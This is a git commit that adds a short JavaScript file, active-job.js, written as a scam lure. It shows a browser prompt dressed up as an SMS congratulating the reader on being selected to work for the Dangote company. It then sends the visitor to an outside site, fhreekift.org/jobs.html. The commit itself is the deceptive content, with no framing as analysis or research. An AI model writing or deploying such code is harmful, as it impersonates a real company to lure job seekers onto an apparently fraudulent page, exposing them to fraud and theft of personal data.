d47ea5e271905e8dd2499e1f88f3d7be4725a19a
mfednewblog9 <newekpeitid@gmail.com>
2025-11-12 09:16:34 +0100

    Create active-job.js

---
+++ active-job.js
@@ -0,0 +1,5 @@
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulation. You are among the selection ones to work in one of the Dangote Company, kindly press Ok to submit application ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://fhreekift.org/jobs.html';
+}
